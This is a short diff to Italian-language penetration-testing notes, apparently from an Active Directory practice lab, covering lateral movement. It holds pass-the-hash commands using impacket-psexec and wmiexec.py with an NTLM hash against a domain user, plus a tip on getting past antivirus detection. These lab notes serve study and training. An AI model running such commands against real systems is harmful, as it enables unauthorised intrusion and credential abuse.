@@ -246,3 +246,7 @@ impacket-psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@1
 Normalmente flaggato da AV. Per bypass creare un exe custom e passarlo con -file
 ![[Pasted image 20230907161746.png]]
 - WmiEcex (Pseudo-Shell)
+Crea un nuovo processo con wmi. Crea un file per ottenere il risultato di un comando, lo legge e poi lo cancella.
+```bash
+wmiexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+```
